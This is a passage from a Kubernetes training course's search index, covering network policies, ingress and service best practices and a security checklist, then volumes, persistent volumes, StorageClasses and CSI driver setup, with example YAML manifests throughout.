- Ingress\n  - Egress\n</code></pre>"},{"location":"03-networking/#53-allow-specific-traffic","title":"5.3 Allow Specific Traffic","text":"<p>Allow from same namespace:</p> <pre><code>apiVersion: networking.k8s.io/v1\nkind: NetworkPolicy\nmetadata:\n  name: allow-same-namespace\n  namespace: production\nspec:\n  podSelector:\n    matchLabels:\n      app: api\n  policyTypes:\n  - Ingress\n  ingress:\n  - from:\n    - podSelector: {}\n</code></pre> <p>Allow from specific Pods:</p> <pre><code>apiVersion: networking.k8s.io/v1\nkind: NetworkPolicy\nmetadata:\n  name: api-allow-frontend\n  namespace: production\nspec:\n  podSelector:\n    matchLabels:\n      app: api\n      tier: backend\n  policyTypes:\n  - Ingress\n  ingress:\n  - from:\n    - podSelector:\n        matchLabels:\n          app: frontend\n    ports:\n    - protocol: TCP\n      port: 8080\n</code></pre> <p>Allow from specific namespace:</p> <pre><code>apiVersion: networking.k8s.io/v1\nkind: NetworkPolicy\nmetadata:\n  name: allow-from-monitoring\n  namespace: production\nspec:\n  podSelector:\n    matchLabels:\n      app: api\n  policyTypes:\n  - Ingress\n  ingress:\n  - from:\n    - namespaceSelector:\n        matchLabels:\n          name: monitoring\n    ports:\n    - protocol: TCP\n      port: 9090\n</code></pre>"},{"location":"03-networking/#54-egress-policies","title":"5.4 Egress Policies","text":"<p>Allow DNS and specific external service:</p> <pre><code>apiVersion: networking.k8s.io/v1\nkind: NetworkPolicy\nmetadata:\n  name: api-egress\n  namespace: production\nspec:\n  podSelector:\n    matchLabels:\n      app: api\n  policyTypes:\n  - Egress\n  egress:\n  # Allow DNS\n  - to:\n    - namespaceSelector:\n        matchLabels:\n          name: kube-system\n    ports:\n    - protocol: UDP\n      port: 53\n  # Allow to database\n  - to:\n    - podSelector:\n        matchLabels:\n          app: database\n    ports:\n    - protocol: TCP\n      port: 5432\n  # Allow to external API\n  - to:\n    - ipBlock:\n        cidr: 0.0.0.0/0\n        except:\n        - 169.254.169.254/32  # Block metadata service\n    ports:\n    - protocol: TCP\n      port: 443\n</code></pre>"},{"location":"03-networking/#55-complete-example-three-tier-application","title":"5.5 Complete Example: Three-Tier Application","text":"<pre><code># Frontend Network Policy\napiVersion: networking.k8s.io/v1\nkind: NetworkPolicy\nmetadata:\n  name: frontend-netpol\n  namespace: production\nspec:\n  podSelector:\n    matchLabels:\n      tier: frontend\n  policyTypes:\n  - Ingress\n  - Egress\n  ingress:\n  # Allow from Ingress controller\n  - from:\n    - namespaceSelector:\n        matchLabels:\n          name: ingress-nginx\n    ports:\n    - protocol: TCP\n      port: 8080\n  egress:\n  # Allow DNS\n  - to:\n    - namespaceSelector:\n        matchLabels:\n          name: kube-system\n      podSelector:\n        matchLabels:\n          k8s-app: kube-dns\n    ports:\n    - protocol: UDP\n      port: 53\n  # Allow to backend\n  - to:\n    - podSelector:\n        matchLabels:\n          tier: backend\n    ports:\n    - protocol: TCP\n      port: 8080\n---\n# Backend Network Policy\napiVersion: networking.k8s.io/v1\nkind: NetworkPolicy\nmetadata:\n  name: backend-netpol\n  namespace: production\nspec:\n  podSelector:\n    matchLabels:\n      tier: backend\n  policyTypes:\n  - Ingress\n  - Egress\n  ingress:\n  # Allow from frontend\n  - from:\n    - podSelector:\n        matchLabels:\n          tier: frontend\n    ports:\n    - protocol: TCP\n      port: 8080\n  egress:\n  # Allow DNS\n  - to:\n    - namespaceSelector:\n        matchLabels:\n          name: kube-system\n      podSelector:\n        matchLabels:\n          k8s-app: kube-dns\n    ports:\n    - protocol: UDP\n      port: 53\n  # Allow to database\n  - to:\n    - podSelector:\n        matchLabels:\n          tier: database\n    ports:\n    - protocol: TCP\n      port: 5432\n---\n# Database Network Policy\napiVersion: networking.k8s.io/v1\nkind: NetworkPolicy\nmetadata:\n  name: database-netpol\n  namespace: production\nspec:\n  podSelector:\n    matchLabels:\n      tier: database\n  policyTypes:\n  - Ingress\n  - Egress\n  ingress:\n  # Allow from backend only\n  - from:\n    - podSelector:\n        matchLabels:\n          tier: backend\n    ports:\n    - protocol: TCP\n      port: 5432\n  egress:\n  # Allow DNS only\n  - to:\n    - namespaceSelector:\n        matchLabels:\n          name: kube-system\n      podSelector:\n        matchLabels:\n          k8s-app: kube-dns\n    ports:\n    - protocol: UDP\n      port: 53\n</code></pre>"},{"location":"03-networking/#6-networking-layers-diagram","title":"6. Networking Layers Diagram","text":"<pre><code>graph TB\n    subgraph \"External Traffic\"\n        USER[External User]\n        INTERNET[Internet]\n    end\n\n    subgraph \"Layer 7 - Application\"\n        INGRESS[Ingress Controller&lt;br/&gt;nginx/traefik&lt;br/&gt;SSL/TLS Termination&lt;br/&gt;HTTP Routing]\n    end\n\n    subgraph \"Layer 4 - Transport\"\n        LB[LoadBalancer Service&lt;br/&gt;Cloud LB]\n        NP[NodePort Service&lt;br/&gt;30000-32767]\n        SVCCIP[ClusterIP Service&lt;br/&gt;10.96.x.x&lt;br/&gt;Load Balancing]\n    end\n\n    subgraph \"Layer 3 - Network\"\n        CNI[CNI Plugin&lt;br/&gt;Calico/Cilium/Flannel&lt;br/&gt;Pod Networking]\n        NETPOL[Network Policies&lt;br/&gt;Traffic Filtering]\n    end\n\n    subgraph \"Worker Node 1\"\n        PROXY1[kube-proxy&lt;br/&gt;iptables/IPVS]\n\n        subgraph \"Pods Node 1\"\n            POD1[Pod 1&lt;br/&gt;10.244.1.5]\n            POD2[Pod 2&lt;br/&gt;10.244.1.6]\n        end\n    end\n\n    subgraph \"Worker Node 2\"\n        PROXY2[kube-proxy&lt;br/&gt;iptables/IPVS]\n\n        subgraph \"Pods Node 2\"\n            POD3[Pod 3&lt;br/&gt;10.244.2.5]\n            POD4[Pod 4&lt;br/&gt;10.244.2.6]\n        end\n    end\n\n    subgraph \"Layer 2/1 - Data Link/Physical\"\n        VXLAN[VXLAN/BGP Overlay&lt;br/&gt;or&lt;br/&gt;Underlay Network]\n    end\n\n    subgraph \"Service Discovery\"\n        DNS[CoreDNS&lt;br/&gt;service.namespace.svc.cluster.local]\n    end\n\n    USER --&gt;|HTTPS| INGRESS\n    INTERNET --&gt;|HTTP/HTTPS| LB\n\n    INGRESS --&gt;|Routes to| SVCCIP\n    LB --&gt;|External IP| NP\n    NP --&gt;|NodePort| PROXY1\n    NP --&gt;|NodePort| PROXY2\n\n    SVCCIP --&gt;|Service IP| PROXY1\n    SVCCIP --&gt;|Service IP| PROXY2\n\n    PROXY1 --&gt;|Distributes| POD1\n    PROXY1 --&gt;|Distributes| POD2\n    PROXY2 --&gt;|Distributes| POD3\n    PROXY2 --&gt;|Distributes| POD4\n\n    CNI -.-&gt;|Pod IPs| POD1\n    CNI -.-&gt;|Pod IPs| POD2\n    CNI -.-&gt;|Pod IPs| POD3\n    CNI -.-&gt;|Pod IPs| POD4\n\n    NETPOL -.-&gt;|Enforces| POD1\n    NETPOL -.-&gt;|Enforces| POD2\n    NETPOL -.-&gt;|Enforces| POD3\n    NETPOL -.-&gt;|Enforces| POD4\n\n    POD1 &lt;--&gt;|Overlay| VXLAN\n    POD2 &lt;--&gt;|Overlay| VXLAN\n    POD3 &lt;--&gt;|Overlay| VXLAN\n    POD4 &lt;--&gt;|Overlay| VXLAN\n\n    POD1 -.-&gt;|Queries| DNS\n    POD2 -.-&gt;|Queries| DNS\n    POD3 -.-&gt;|Queries| DNS\n    POD4 -.-&gt;|Queries| DNS\n\n    style INGRESS fill:#FF6B6B,stroke:#fff,color:#fff\n    style LB fill:#4ECDC4,stroke:#fff,color:#fff\n    style SVCCIP fill:#4ECDC4,stroke:#fff,color:#fff\n    style CNI fill:#95E1D3,stroke:#fff,color:#000\n    style NETPOL fill:#F38181,stroke:#fff,color:#fff\n    style DNS fill:#AA96DA,stroke:#fff,color:#fff</code></pre>"},{"location":"03-networking/#7-best-practices","title":"7. Best Practices","text":""},{"location":"03-networking/#71-cni-best-practices","title":"7.1 CNI Best Practices","text":"<ol> <li>Choose appropriate CNI for your use case</li> <li>Calico: Enterprise features, network policies</li> <li>Cilium: Advanced security, observability</li> <li> <p>Flannel: Simplicity</p> </li> <li> <p>Use overlay only when necessary</p> </li> <li>Underlay/BGP for better performance</li> <li> <p>Overlay for flexibility and ease</p> </li> <li> <p>Enable encryption for multi-tenant clusters</p> </li> <li>WireGuard encryption (Calico, Cilium)</li> <li> <p>IPSec for compliance</p> </li> <li> <p>Monitor CNI performance</p> </li> <li>Network latency</li> <li>Packet loss</li> <li>CNI plugin errors</li> </ol>"},{"location":"03-networking/#72-service-best-practices","title":"7.2 Service Best Practices","text":"<ol> <li>Use ClusterIP for internal services</li> <li>More secure</li> <li>Better performance</li> <li> <p>Simpler networking</p> </li> <li> <p>Avoid NodePort in production</p> </li> <li>Use Ingress instead</li> <li>Limited port range</li> <li> <p>Security concerns</p> </li> <li> <p>Configure health checks</p> </li> <li>Readiness probes</li> <li>Liveness probes</li> <li> <p>Startup probes</p> </li> <li> <p>Use sessionAffinity judiciously</p> </li> <li>Only when necessary</li> <li>Can cause load imbalance</li> </ol>"},{"location":"03-networking/#73-ingress-best-practices","title":"7.3 Ingress Best Practices","text":"<ol> <li>Always use TLS/SSL</li> <li>cert-manager for automation</li> <li>Strong cipher suites</li> <li> <p>TLS 1.2 minimum</p> </li> <li> <p>Implement rate limiting</p> </li> <li>Prevent abuse</li> <li>Protect backend services</li> <li> <p>DDoS mitigation</p> </li> <li> <p>Use authentication/authorization</p> </li> <li>OAuth2/OIDC</li> <li>Basic auth for testing only</li> <li> <p>External auth services</p> </li> <li> <p>Monitor Ingress metrics</p> </li> <li>Request rates</li> <li>Error rates</li> <li>Latency</li> </ol>"},{"location":"03-networking/#74-network-policy-best-practices","title":"7.4 Network Policy Best Practices","text":"<ol> <li>Implement default deny</li> <li>Start with deny-all</li> <li>Add explicit allows</li> <li> <p>Zero-trust approach</p> </li> <li> <p>Use namespace isolation</p> </li> <li>Label namespaces</li> <li>Control cross-namespace traffic</li> <li> <p>Enforce tenant isolation</p> </li> <li> <p>Allow DNS explicitly</p> </li> <li>Required for most workloads</li> <li>Allow to kube-dns/CoreDNS</li> <li> <p>UDP port 53</p> </li> <li> <p>Document network policies</p> </li> <li>Policy purpose</li> <li>Affected services</li> <li> <p>Change history</p> </li> <li> <p>Test policies thoroughly</p> </li> <li>Use network policy simulators</li> <li>Test in non-production first</li> <li>Have rollback plan</li> </ol>"},{"location":"03-networking/#8-anti-patterns-and-common-mistakes","title":"8. Anti-Patterns and Common Mistakes","text":""},{"location":"03-networking/#81-networking-anti-patterns","title":"8.1 Networking Anti-Patterns","text":"<p>\u274c No network policies - All Pods can communicate - No micro-segmentation - Security risk</p> <p>\u274c Overly permissive policies <pre><code># TOO PERMISSIVE\negress:\n- to:\n  - ipBlock:\n      cidr: 0.0.0.0/0  # Allow all egress!\n</code></pre></p> <p>\u274c Using hostNetwork unnecessarily <pre><code># AVOID unless absolutely necessary\nspec:\n  hostNetwork: true\n  containers:\n  - name: app\n    image: myapp:1.0\n</code></pre></p>"},{"location":"03-networking/#82-service-anti-patterns","title":"8.2 Service Anti-Patterns","text":"<p>\u274c Selector mismatch <pre><code># Service selector doesn't match any Pods\nService: app=frontend\nPod labels: app=front-end\n</code></pre></p> <p>\u274c No readiness probe - Traffic sent to unavailable Pods - Service disruption - Poor user experience</p> <p>\u274c Wrong service type - LoadBalancer for internal services (expensive) - NodePort for production (insecure) - ClusterIP for external access (won't work)</p>"},{"location":"03-networking/#83-ingress-anti-patterns","title":"8.3 Ingress Anti-Patterns","text":"<p>\u274c No TLS - Data transmitted in clear text - Credentials exposed - Compliance violations</p> <p>\u274c Wildcard hosts without authentication <pre><code># INSECURE\nspec:\n  rules:\n  - host: \"*.example.com\"  # Too permissive\n</code></pre></p> <p>\u274c No rate limiting - Vulnerable to abuse - No DDoS protection - Resource exhaustion</p>"},{"location":"03-networking/#9-hands-on-lab-references","title":"9. Hands-on Lab References","text":"<p>This module includes the following hands-on labs in the <code>/labs/03-networking/</code> directory:</p> <ol> <li>Lab 3.1: CNI Plugin Installation</li> <li>Install and configure Calico</li> <li>Compare with Cilium</li> <li>Test Pod-to-Pod communication</li> <li> <p>File: <code>/labs/03-networking/lab-3.1-cni-setup.md</code></p> </li> <li> <p>Lab 3.2: Service Types</p> </li> <li>Create ClusterIP, NodePort, LoadBalancer services</li> <li>Test service discovery</li> <li>Configure session affinity</li> <li> <p>File: <code>/labs/03-networking/lab-3.2-services.md</code></p> </li> <li> <p>Lab 3.3: Ingress Configuration</p> </li> <li>Deploy NGINX Ingress Controller</li> <li>Configure TLS with cert-manager</li> <li>Implement path-based routing</li> <li> <p>File: <code>/labs/03-networking/lab-3.3-ingress.md</code></p> </li> <li> <p>Lab 3.4: Network Policies</p> </li> <li>Implement default deny</li> <li>Create allow policies</li> <li>Test policy enforcement</li> <li>Troubleshoot connectivity</li> <li>File: <code>/labs/03-networking/lab-3.4-network-policies.md</code></li> </ol>"},{"location":"03-networking/#10-security-checklist","title":"10. Security Checklist","text":""},{"location":"03-networking/#cni-security","title":"CNI Security","text":"<ul> <li>[ ] Enable encryption in transit (WireGuard/IPSec)</li> <li>[ ] Use network policies (choose CNI that supports them)</li> <li>[ ] Restrict CNI plugin permissions</li> <li>[ ] Monitor CNI component logs</li> <li>[ ] Keep CNI plugins updated</li> <li>[ ] Use separate network for control plane</li> </ul>"},{"location":"03-networking/#service-security","title":"Service Security","text":"<ul> <li>[ ] Use ClusterIP for internal services</li> <li>[ ] Implement Network Policies for service endpoints</li> <li>[ ] Configure appropriate session affinity</li> <li>[ ] Use headless services for StatefulSets</li> <li>[ ] Restrict LoadBalancer source ranges</li> <li>[ ] Use externalTrafficPolicy: Local when needed</li> </ul>"},{"location":"03-networking/#ingress-security","title":"Ingress Security","text":"<ul> <li>[ ] Always use TLS/SSL in production</li> <li>[ ] Implement rate limiting</li> <li>[ ] Configure authentication (OAuth2/OIDC)</li> <li>[ ] Use WAF (Web Application Firewall)</li> <li>[ ] Restrict allowed hosts</li> <li>[ ] Enable access logging</li> <li>[ ] Implement DDoS protection</li> <li>[ ] Use strong TLS ciphers (TLS 1.2+)</li> <li>[ ] Implement HSTS headers</li> <li>[ ] Regular security scanning</li> </ul>"},{"location":"03-networking/#network-policy-security","title":"Network Policy Security","text":"<ul> <li>[ ] Implement default deny policies</li> <li>[ ] Use namespace isolation</li> <li>[ ] Allow DNS explicitly</li> <li>[ ] Block metadata service (169.254.169.254)</li> <li>[ ] Document all policies</li> <li>[ ] Test policies before production</li> <li>[ ] Regular policy audits</li> <li>[ ] Monitor policy violations</li> <li>[ ] Implement egress filtering</li> <li>[ ] Use label-based policies</li> </ul>"},{"location":"03-networking/#11-references","title":"11. References","text":"<ol> <li>Kubernetes Official Documentation</li> <li>Networking Model: https://kubernetes.io/docs/concepts/cluster-administration/networking/</li> <li>Services: https://kubernetes.io/docs/concepts/services-networking/service/</li> <li>Ingress: https://kubernetes.io/docs/concepts/services-networking/ingress/</li> <li> <p>Network Policies: https://kubernetes.io/docs/concepts/services-networking/network-policies/</p> </li> <li> <p>CNI Documentation</p> </li> <li>CNI Specification: https://github.com/containernetworking/cni</li> <li>Calico Documentation: https://docs.tigera.io/calico/latest/about/</li> <li>Cilium Documentation: https://docs.cilium.io/</li> <li> <p>Flannel Documentation: https://github.com/flannel-io/flannel</p> </li> <li> <p>Ingress Controllers</p> </li> <li>NGINX Ingress: https://kubernetes.github.io/ingress-nginx/</li> <li>Traefik: https://doc.traefik.io/traefik/</li> <li> <p>cert-manager: https://cert-manager.io/docs/</p> </li> <li> <p>Security Resources</p> </li> <li>Network Policy Recipes: https://github.com/ahmetb/kubernetes-network-policy-recipes</li> <li>CIS Kubernetes Benchmark: https://www.cisecurity.org/benchmark/kubernetes</li> <li> <p>NSA/CISA Kubernetes Hardening Guide: https://media.defense.gov/2022/Aug/29/2003066362/-1/-1/0/CTR_KUBERNETES_HARDENING_GUIDANCE_1.2_20220829.PDF</p> </li> <li> <p>CNCF Resources</p> </li> <li>CNCF Network SIG: https://github.com/kubernetes/community/tree/master/sig-network</li> <li> <p>Service Mesh Landscape: https://landscape.cncf.io/guide#orchestration-management--service-mesh</p> </li> <li> <p>Books and Guides</p> </li> <li>\"Kubernetes Networking\" by James Strong and Vallery Lancey (O'Reilly)</li> <li>\"Container Networking\" by Michael Hausenblas (O'Reilly)</li> </ol>"},{"location":"03-networking/#summary","title":"Summary","text":"<p>In this module, you learned about Kubernetes networking:</p> <p>Networking Model: - Pod-to-Pod communication without NAT - Each Pod gets unique IP - Service abstraction for stable endpoints</p> <p>CNI Plugins: - Calico for enterprise features and network policies - Cilium for eBPF-based performance and L7 policies - Flannel for simplicity</p> <p>Services: - ClusterIP for internal communication - NodePort for simple external access - LoadBalancer for production external services - Headless services for StatefulSets</p> <p>Ingress: - HTTP/HTTPS routing and load balancing - TLS termination - Path and host-based routing - Integration with cert-manager</p> <p>Network Policies: - Micro-segmentation and zero-trust - Default deny approach - Namespace and Pod-level isolation</p> <p>Next Module: 04-storage.md - Kubernetes Storage</p>"},{"location":"04-storage/","title":"Module 04: Kubernetes Storage","text":""},{"location":"04-storage/#overview","title":"Overview","text":"<p>Estimated Time: 4-5 hours</p> <p>Module Type: Deep Dive</p> <p>Prerequisites: - Module 01 - Kubernetes Basics - Module 02 - Control Plane and Cluster Components - Basic understanding of storage concepts (block, file, object storage)</p> <p>Storage in Kubernetes is a critical component for stateful applications. This module covers the various storage abstractions Kubernetes provides, from ephemeral volumes to persistent storage with dynamic provisioning. You'll learn about Volumes, PersistentVolumes (PV), PersistentVolumeClaims (PVC), StorageClasses, and how to deploy stateful applications using StatefulSets.</p>"},{"location":"04-storage/#learning-objectives","title":"Learning Objectives","text":"<p>By the end of this module, you will be able to:</p> <ol> <li>Understand the different types of Kubernetes volumes and their use cases</li> <li>Configure PersistentVolumes and PersistentVolumeClaims</li> <li>Implement dynamic provisioning with StorageClasses</li> <li>Work with Container Storage Interface (CSI) drivers</li> <li>Deploy and manage StatefulSets for stateful applications</li> <li>Implement backup and disaster recovery strategies</li> <li>Apply storage security best practices</li> <li>Troubleshoot common storage issues</li> </ol>"},{"location":"04-storage/#1-volume-fundamentals","title":"1. Volume Fundamentals","text":""},{"location":"04-storage/#11-why-volumes","title":"1.1 Why Volumes?","text":"<p>Containers are ephemeral\u2014when they restart, all data is lost. Volumes solve this problem by providing persistent storage that outlives individual containers.</p> <p>Key Concepts: - Volumes are defined in Pod specifications - Mounted into container filesystems - Lifetime tied to Pod (for most volume types) - Can be shared between containers in a Pod</p>"},{"location":"04-storage/#12-volume-types-overview","title":"1.2 Volume Types Overview","text":"<p>Kubernetes supports many volume types:</p> <p>Ephemeral: - <code>emptyDir</code> - Empty directory, lifecycle tied to Pod - <code>configMap</code> - Configuration data - <code>secret</code> - Sensitive data - <code>downwardAPI</code> - Pod/container metadata</p> <p>Persistent: - <code>hostPath</code> - Node filesystem (development only) - <code>persistentVolumeClaim</code> - Abstract persistent storage - CSI volumes - Via Container Storage Interface</p> <p>Cloud Provider: - <code>awsElasticBlockStore</code> - AWS EBS - <code>azureDisk</code> / <code>azureFile</code> - Azure storage - <code>gcePersistentDisk</code> - GCP Persistent Disk</p> <p>Network: - <code>nfs</code> - Network File System - <code>cephfs</code> - Ceph filesystem - <code>glusterfs</code> - GlusterFS</p>"},{"location":"04-storage/#2-basic-volume-types","title":"2. Basic Volume Types","text":""},{"location":"04-storage/#21-emptydir","title":"2.1 emptyDir","text":"<p>Temporary directory created when Pod is assigned to node. Deleted when Pod is removed.</p> <pre><code>apiVersion: v1\nkind: Pod\nmetadata:\n  name: cache-pod\nspec:\n  containers:\n  - name: app\n    image: myapp:1.0\n    volumeMounts:\n    - name: cache-volume\n      mountPath: /cache\n  - name: cache-warmer\n    image: cache-warmer:1.0\n    volumeMounts:\n    - name: cache-volume\n      mountPath: /cache\n  volumes:\n  - name: cache-volume\n    emptyDir:\n      sizeLimit: 1Gi  # Optional size limit\n</code></pre> <p>Use Cases: - Scratch space for computations - Cache storage - Shared storage between containers in same Pod</p> <p>emptyDir with Memory:</p> <pre><code>volumes:\n- name: memory-volume\n  emptyDir:\n    medium: Memory  # Use tmpfs (RAM)\n    sizeLimit: 256Mi\n</code></pre>"},{"location":"04-storage/#22-hostpath","title":"2.2 hostPath","text":"<p>Mounts a file or directory from the host node's filesystem.</p> <pre><code>apiVersion: v1\nkind: Pod\nmetadata:\n  name: hostpath-pod\nspec:\n  containers:\n  - name: app\n    image: myapp:1.0\n    volumeMounts:\n    - name: host-volume\n      mountPath: /host-data\n      readOnly: true\n  volumes:\n  - name: host-volume\n    hostPath:\n      path: /var/data\n      type: Directory\n</code></pre> <p>hostPath Types: - <code>Directory</code> - Must exist - <code>DirectoryOrCreate</code> - Create if doesn't exist - <code>File</code> - Must exist - <code>FileOrCreate</code> - Create if doesn't exist - <code>Socket</code> - Unix socket - <code>CharDevice</code> / <code>BlockDevice</code> - Device files</p> <p>\u26a0\ufe0f Security Warning: - Avoid in production - Pods can access host filesystem - Security risk - Node affinity issues</p>"},{"location":"04-storage/#23-configmap-volumes","title":"2.3 ConfigMap Volumes","text":"<p>Mount ConfigMaps as volumes to inject configuration files.</p> <pre><code>apiVersion: v1\nkind: ConfigMap\nmetadata:\n  name: app-config\ndata:\n  app.conf: |\n    server {\n      listen 80;\n      server_name example.com;\n    }\n  logging.conf: |\n    level: info\n    format: json\n---\napiVersion: v1\nkind: Pod\nmetadata:\n  name: configmap-pod\nspec:\n  containers:\n  - name: app\n    image: myapp:1.0\n    volumeMounts:\n    - name: config-volume\n      mountPath: /etc/config\n      readOnly: true\n  volumes:\n  - name: config-volume\n    configMap:\n      name: app-config\n      items:\n      - key: app.conf\n        path: app.conf\n      - key: logging.conf\n        path: logging.conf\n</code></pre>"},{"location":"04-storage/#24-secret-volumes","title":"2.4 Secret Volumes","text":"<p>Mount Secrets as volumes for sensitive data.</p> <pre><code>apiVersion: v1\nkind: Secret\nmetadata:\n  name: db-credentials\ntype: Opaque\nstringData:\n  username: admin\n  password: SecureP@ssw0rd!\n---\napiVersion: v1\nkind: Pod\nmetadata:\n  name: secret-pod\nspec:\n  containers:\n  - name: app\n    image: myapp:1.0\n    volumeMounts:\n    - name: secret-volume\n      mountPath: /etc/secrets\n      readOnly: true\n  volumes:\n  - name: secret-volume\n    secret:\n      secretName: db-credentials\n      defaultMode: 0400  # Read-only for owner\n</code></pre>"},{"location":"04-storage/#3-persistent-volumes-and-claims","title":"3. Persistent Volumes and Claims","text":""},{"location":"04-storage/#31-persistentvolume-pv","title":"3.1 PersistentVolume (PV)","text":"<p>A PersistentVolume is a piece of storage in the cluster that has been provisioned by an administrator or dynamically provisioned using StorageClasses.</p> <p>Lifecycle: - Independent of any Pod - Can be pre-provisioned or dynamically provisioned - Reclaimed when claim is deleted</p> <p>Example PV:</p> <pre><code>apiVersion: v1\nkind: PersistentVolume\nmetadata:\n  name: mysql-pv\n  labels:\n    type: local\nspec:\n  storageClassName: manual\n  capacity:\n    storage: 10Gi\n  accessModes:\n  - ReadWriteOnce\n  persistentVolumeReclaimPolicy: Retain\n  hostPath:\n    path: /mnt/data\n</code></pre> <p>Access Modes: - <code>ReadWriteOnce (RWO)</code> - Mounted read-write by single node - <code>ReadOnlyMany (ROX)</code> - Mounted read-only by many nodes - <code>ReadWriteMany (RWX)</code> - Mounted read-write by many nodes - <code>ReadWriteOncePod (RWOP)</code> - Mounted read-write by single Pod (1.27+)</p> <p>Reclaim Policies: - <code>Retain</code> - Manual reclamation (data preserved) - <code>Delete</code> - Volume deleted when claim released - <code>Recycle</code> - Basic scrub (deprecated)</p>"},{"location":"04-storage/#32-persistentvolumeclaim-pvc","title":"3.2 PersistentVolumeClaim (PVC)","text":"<p>A request for storage by a user. Claims can request specific size and access modes.</p> <pre><code>apiVersion: v1\nkind: PersistentVolumeClaim\nmetadata:\n  name: mysql-pvc\nspec:\n  storageClassName: manual\n  accessModes:\n  - ReadWriteOnce\n  resources:\n    requests:\n      storage: 5Gi\n  selector:\n    matchLabels:\n      type: local\n</code></pre> <p>Using PVC in Pod:</p> <pre><code>apiVersion: v1\nkind: Pod\nmetadata:\n  name: mysql-pod\nspec:\n  containers:\n  - name: mysql\n    image: mysql:8.0\n    env:\n    - name: MYSQL_ROOT_PASSWORD\n      valueFrom:\n        secretKeyRef:\n          name: mysql-secret\n          key: password\n    volumeMounts:\n    - name: mysql-storage\n      mountPath: /var/lib/mysql\n  volumes:\n  - name: mysql-storage\n    persistentVolumeClaim:\n      claimName: mysql-pvc\n</code></pre>"},{"location":"04-storage/#33-pvpvc-binding","title":"3.3 PV/PVC Binding","text":"<p>Binding Process: 1. User creates PVC with requirements 2. Control plane watches for new PVCs 3. Finds matching PV based on:    - Storage class    - Access modes    - Capacity    - Selector labels 4. Binds PVC to PV 5. PVC status becomes <code>Bound</code></p> <p>PVC States: - <code>Pending</code> - Waiting for binding or provisioning - <code>Bound</code> - Bound to a PV - <code>Lost</code> - PV was deleted but claim still exists</p>"},{"location":"04-storage/#4-storageclasses-and-dynamic-provisioning","title":"4. StorageClasses and Dynamic Provisioning","text":""},{"location":"04-storage/#41-what-are-storageclasses","title":"4.1 What are StorageClasses?","text":"<p>StorageClasses provide a way to describe \"classes\" of storage with different performance characteristics, backup policies, or arbitrary policies.</p> <p>Benefits: - Dynamic provisioning (no pre-creation needed) - Abstraction of storage implementation - Different tiers (SSD, HDD, etc.) - Automated lifecycle management</p>"},{"location":"04-storage/#42-storageclass-examples","title":"4.2 StorageClass Examples","text":"<p>AWS EBS:</p> <pre><code>apiVersion: storage.k8s.io/v1\nkind: StorageClass\nmetadata:\n  name: fast-ssd\nprovisioner: kubernetes.io/aws-ebs\nparameters:\n  type: gp3\n  iops: \"3000\"\n  throughput: \"125\"\n  encrypted: \"true\"\n  kmsKeyId: arn:aws:kms:us-east-1:123456789:key/...\nallowVolumeExpansion: true\nreclaimPolicy: Delete\nvolumeBindingMode: WaitForFirstConsumer\n</code></pre> <p>GCP Persistent Disk:</p> <pre><code>apiVersion: storage.k8s.io/v1\nkind: StorageClass\nmetadata:\n  name: fast-gcp\nprovisioner: kubernetes.io/gce-pd\nparameters:\n  type: pd-ssd\n  replication-type: regional-pd\nallowVolumeExpansion: true\nreclaimPolicy: Delete\nvolumeBindingMode: WaitForFirstConsumer\n</code></pre> <p>Azure Disk:</p> <pre><code>apiVersion: storage.k8s.io/v1\nkind: StorageClass\nmetadata:\n  name: managed-premium\nprovisioner: kubernetes.io/azure-disk\nparameters:\n  storageaccounttype: Premium_LRS\n  kind: Managed\nallowVolumeExpansion: true\nreclaimPolicy: Delete\nvolumeBindingMode: WaitForFirstConsumer\n</code></pre> <p>NFS:</p> <pre><code>apiVersion: storage.k8s.io/v1\nkind: StorageClass\nmetadata:\n  name: nfs-storage\nprovisioner: nfs.csi.k8s.io\nparameters:\n  server: nfs-server.example.com\n  share: /exports/kubernetes\nmountOptions:\n  - hard\n  - nfsvers=4.1\nreclaimPolicy: Retain\nvolumeBindingMode: Immediate\n</code></pre>"},{"location":"04-storage/#43-volume-binding-modes","title":"4.3 Volume Binding Modes","text":"<p>Immediate: - PV created immediately when PVC is created - May create volume in wrong zone/location</p> <p>WaitForFirstConsumer (recommended): - Delays PV binding/provisioning until Pod using PVC is created - Ensures volume created in same zone as Pod - Better for multi-zone clusters</p>"},{"location":"04-storage/#44-using-storageclass","title":"4.4 Using StorageClass","text":"<pre><code>apiVersion: v1\nkind: PersistentVolumeClaim\nmetadata:\n  name: fast-storage-claim\nspec:\n  storageClassName: fast-ssd\n  accessModes:\n  - ReadWriteOnce\n  resources:\n    requests:\n      storage: 100Gi\n---\napiVersion: v1\nkind: Pod\nmetadata:\n  name: app-pod\nspec:\n  containers:\n  - name: app\n    image: myapp:1.0\n    volumeMounts:\n    - name: data\n      mountPath: /data\n  volumes:\n  - name: data\n    persistentVolumeClaim:\n      claimName: fast-storage-claim\n</code></pre>"},{"location":"04-storage/#45-default-storageclass","title":"4.5 Default StorageClass","text":"<pre><code>apiVersion: storage.k8s.io/v1\nkind: StorageClass\nmetadata:\n  name: standard\n  annotations:\n    storageclass.kubernetes.io/is-default-class: \"true\"\nprovisioner: kubernetes.io/aws-ebs\nparameters:\n  type: gp3\n</code></pre>"},{"location":"04-storage/#5-container-storage-interface-csi","title":"5. Container Storage Interface (CSI)","text":""},{"location":"04-storage/#51-what-is-csi","title":"5.1 What is CSI?","text":"<p>CSI is a standard for exposing storage systems to containerized workloads. It provides:</p> <ul> <li>Vendor-neutral storage interface</li> <li>Out-of-tree storage plugins</li> <li>Rich feature set (snapshots, cloning, expansion)</li> </ul>"},{"location":"04-storage/#52-popular-csi-drivers","title":"5.2 Popular CSI Drivers","text":"<p>AWS EBS CSI:</p> <pre><code># Install EBS CSI driver\nkubectl apply -k \"github.com/kubernetes-sigs/aws-ebs-csi-driver/deploy/kubernetes/overlays/stable/?ref=release-1.20\"\n</code></pre> <pre><code>apiVersion: storage.k8s.io/v1\nkind: StorageClass\nmetadata:\n  name: ebs-sc\nprovisioner: ebs.csi.aws.com\nparameters:\n  type: gp3\n  encrypted: \"true\"\nvolumeBindingMode: WaitForFirstConsumer\nallowVolumeExpansion: true\n</code></pre> <p>Longhorn (Cloud-Native Storage):</p> <pre><code># Install Longhorn\nkubectl apply -f https://raw.githubusercontent.com/longhorn/longhorn/v1.5.0/deploy/longhorn.yaml\n</code></pre> <pre><code>apiVersion: storage.k8s.io/v1\nkind: StorageClass\nmetadata:\n  name: longhorn\nprovisioner: driver.longhorn.io\nallowVolumeExpansion: true\nreclaimPolicy: Delete\nvolumeBindingMode: Immediate\nparameters:\n  numberOfReplicas: \"3\"\n  staleReplicaTimeout: \"2880\"\n  fromBackup: 